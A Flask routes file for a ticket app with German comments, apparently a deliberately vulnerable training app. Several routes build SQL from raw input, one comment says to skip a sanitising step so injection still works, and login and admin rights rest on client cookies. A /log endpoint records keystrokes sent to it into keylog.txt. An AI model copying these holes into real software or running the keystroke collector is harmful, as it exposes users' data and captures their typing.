from ticket import app, db # Einbinden von Variable db und app aus __init__.py
from flask import render_template, request, redirect, url_for, jsonify # import von Methoden aus Flask
from sqlalchemy import text # Import von Methode text() von sqlalchemy
import datetime

# Route für Homepage auf "http://127.0.0.1:5000/"
@app.route("/")
def home_page():
    # laden der home.html
    return render_template("home.html")

# Route für Tickets auf "http://127.0.0.1:5000/tickets"
@app.route("/tickets")
def tickets_page():
    # Überprüfen ob ein Cookie gesetzt/gespeichert ist
    if not request.cookies.get("name"):
        # Wenn nicht dann weiterleiten zu login_page zum Anmelden
        return redirect(url_for("login_page"))
    
    # Wenn ja, also bereits angemeldet
    query_stmt = f"select * from bugitems"          # select-Operation für Abfrage
    result = db.session.execute(text(query_stmt))   # Ergebnis der Abfrage aus DB in result speichern
    items = result.fetchall()                       # konvertiert ergebnis in Liste mit Tupeln 
    #items = result.mappings().all()
    #z.b. [(1, "Anmeldung fehlschlägt", "Offen", "2024-12-01"), (2, "Seite lädt langsam", "In Bearbeitung", "2024-12-05"), ...]

    print(items)

    name = request.cookies.get("name")  # speichert den Value für name aus dem Cookie in Varible name
    print(name)

    return render_template("tickets.html", items=items, name=name)  # tickets.html wird geladen und es stellt Variable items und name zur Verfügung in tickets.html zum Einbinden


@app.route("/register", methods=["GET", "POST"])
def register_page():
    if request.method == "POST":
    # Wenn POST Request d.h. Formulardaten abgeschickt werden --> soll hier die daten verarbeitet werden und in DB gespeichert werden!!
        print("post")
        # Formulardaten speichern
        username = request.form.get("username")
        email = request.form.get("email")
        password1 = request.form.get("password1")
        password2 = request.form.get("password2")
        isAdmin = int(bool(request.form.get("is_admin")))
        print(username, email, password1, password2, isAdmin)

        # Wenn Passwörter übereinstimmen --> Registrierung erfolgreich und Formulardaten in DB speichern
        if password1 == password2:
            # SQL Statement neuen User hinzuzufügen !! darauf achten, dass Variablen in extra Anführungszeichen stehen, sonst kann nicht verarbeitet werden von DB !!
            queryStmt = f"Insert into bugusers(username, email_address, password, is_admin) values('{username}', '{email}', '{password1}', '{isAdmin}')"
            result = db.session.execute(text(queryStmt))
            # Ohne Commit werden Daten nicht gespeichert in DB
            db.session.commit()
            print(result)

            # Bei ERfolg bekommt User eine Meldung auf Login_page mit Meldung von success
            success= f"Register was successful. You can now login with your Username:{username} and your created Password."
            print(success)
            # bei redirect können keine extra variablen übergeben werden wie bei render_template, 
            # deshalb wird hier success variable im link mit übergeben im request-header --> so kann daten im link in login.html übergeben werden und eingbunden werden
            return redirect(f"/login?success={success}")    # !! könnte man auch mit cookie machen !!
                                                            #resp = make_response(redirect("/login"))
                                                            #resp.set_cookie("success", success, max_age=5)  # läuft nach 5 Sekunden ab
                                                            #return resp
        
        # wenn passwort nicht übereinstimmt
        if password1 != password2:
            failure = " Passwords doesn't match"
            # register.html wird erneut geladen und es wird failure-Nachricht angezeigt
            return render_template("register.html", failure=failure)
    
    if request.method == "GET":
    ## Anzeigen der register-Page und nichts weiter
        return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        print("post")

        username = request.form.get("username")         # strip()--> entfernt Leerzeichen (oder Whitespace-Zeichen wie \n, \t) am Anfang und Ende eines Strings
        password = request.form.get("password")         # verhindert ein paar SQL injections, deshalb weglassen

        print(username, password)

        query_stmt = f"select username, is_admin from bugusers where username = '{username}' and password = '{password}'"
        print(query_stmt)
        result = db.session.execute(text(query_stmt))
        buguser = result.fetchone()
        print(buguser)

        if not buguser:
            print("kein user und passwort in db dazu")
            msg = "no user with this credentials found. False Username or Passwor. Try again"
            return render_template("login.html", msg=msg)
        else:
            print("hat geklappt")
            # Cookie um Login-Daten zu speichern
            resp = redirect("/tickets")
            resp.set_cookie("name", username)

            isAdmin = "True" if buguser.is_admin else "False"
            resp.set_cookie("isAdmin", isAdmin)

            resp.set_cookie("user_data", str(buguser))
            
            return resp
            #return redirect(url_for("tickets_page"))
       
    return render_template("login.html")


@app.route("/moreInfo", methods=["GET", "POST"])
def moreInfo_page():
    ticketId = request.args.get("ticketId")
    
    if request.method == "GET":
        #Datenbank Infos von Datenbank abholen und in html anzeigen
        print("get")
        queryStmnt = f"select * from bugitems where id='{ticketId}'"
        result = db.session.execute(text(queryStmnt))
        ticketItem = result.fetchone()
        print(ticketItem)
        return render_template("moreInfo.html", ticketItem=ticketItem)
    
    if request.method == "POST":
        print("post")
        # Geänderte TicketItem Werte in Form mit alter table in bugitems übernehmen
        priority = request.form.get("priority")
        username = request.form.get("username")
        title = request.form.get("title")
        description = request.form.get("description")
        print(priority, username, title, description)

        queryStmnt = (
            f"update bugitems set priority='{priority}'," 
            f"username='{username}',"
            f"title='{title}',"
            f"description='{description}' "
            f"where id='{ticketId}'"
        )

        db.session.execute(text(queryStmnt))
        db.session.commit()
        return redirect("/tickets")


@app.route("/logout")
def logout_page():
    resp = redirect("/")
    resp.set_cookie("name", expires=0) # hier wird cookie nur als abgelaufen markiert --> resp.set_cookie("name", max_age=0) ist dasselbe
    #resp.delete_cookie("name")          # hier wird cookie gelöscht
    return resp

@app.route("/newTicket", methods=["GET", "POST"])
def newTicket_page():
    print("jetzt in ticket_page-function")
    name = request.cookies.get("name")
    print(name)

    # Wenn nicht angemeldet, dann Weiterleiten an login_page und fertig hier 
    # --> muss nicht zwingend angemeldet sein, da auch GET-Request auf /newTicket gemacht werden kann ohne eigeloogt zu sein( nur über Adressleiste, da Button habe ich entfernt bei Nicht-Eingeloggtem User)
    if not name:
        print("nicht angemeldet")
        return redirect(url_for("login_page"))  # wichtig: return nicht vergessen, sonst durchläuft programm weiterhin funktion, was man nicht will
    
    ## alles was folgt wird nur noch ausgeführt wenn angemeldet
    # wenn post request gesendet wird, dass heißt formular abgeschickt wird
    if request.method == "POST":
        print("post")

        # Formulardaten abspeichern
        priority = request.form.get("priority")
        username = request.form.get("username")
        title = request.form.get("title")
        description = request.form.get("description")

        print(priority, username, title, description)

        # in Datenbank schreiben
        #queryStmt = f"insert into bugitems(priority, username, title, description) values('{priority}', '{username}', '{title}', '{description}')"
        #result = db.session.execute(text(queryStmt))
        stmt = text("INSERT INTO bugitems(priority, username, title, description) VALUES (:priority, :username, :title, :description)")
        db.session.execute(stmt, {
            "priority": priority,
            "username": username,
            "title": title,
            "description": description
        })

        #print(result)
        # Speichern der DAten in DB
        db.session.commit()

        # weiterleiten zu Ticketübersicht-Page
        resp = redirect("/tickets")
        # anhängen von Cookie mit angemeldetem Username 
        resp.set_cookie("name", name)
        return resp
    
    if request.method == "GET":
        return render_template("newTicket.html")
    
    #return render_template("newTicket.html") --> kann auch so gemacht werden, da der einzige Fall wo der Code noch hierunterkommt ist wenn es ein GET-Request ist !!


@app.route("/account")
def account_page():
    print("jetzt in account page")

    loggedName = request.cookies.get("name")
    isAdmin = request.cookies.get("isAdmin")

    # Überprüfen ob ein Cookie gesetzt/gespeichert ist
    if not loggedName:
        # Wenn nicht dann weiterleiten zu login_page zum Anmelden
        return redirect(url_for("login_page"))
    
    # Wenn ja, also bereits angemeldet
    if loggedName:
        # wenn User ein Admin ist ( muss als String verglichen werden, da request.cookies.get("isAdmin") der Wert davon wird als String gespeichert !!!!)
        if isAdmin == "True":
            query_stmt = f"select * from bugusers;"          # select-Operation für Abfrage aller User Konten, weil Admin

        # wenn User kein Admin ist
        if isAdmin == "False":
            query_stmt = f"select * from bugusers where username = '{loggedName}';"

        result = db.session.execute(text(query_stmt))   # Ergebnis der Abfrage aus DB in result speichern
        users = result.fetchall()                       # konvertiert ergebnis in Liste mit Tupeln 
        print(users)

        return render_template("account.html", users=users, loggedName=loggedName)  # account.html wird geladen und es stellt Variable users und name zur Verfügung in account.html zum Einbinden
    

@app.route("/faq", methods=["GET", "POST"])
def faq_page():
    print("jetzt in faq-Page.")
    print('test')
    confirm = None

    if request.method == "POST":
        question = request.form.get("question")
        print(question)
        if question:
            confirm = f"Deine Frage: '{question}' wurde übermitellt und wird so schnell wie möglich beantwortet."

    return render_template("faq.html", confirm=confirm)


@app.route("/log", methods=["POST"])
def log_key():
    print(">>> log_key wurde aufgerufen")  # Debug
    data = request.get_json()
    print(">>> empfangene Daten:", data)   # Debug
    key = data.get('key')
    with open('keylog.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - {key}\n")
    return jsonify({"status":"logged"}), 200
        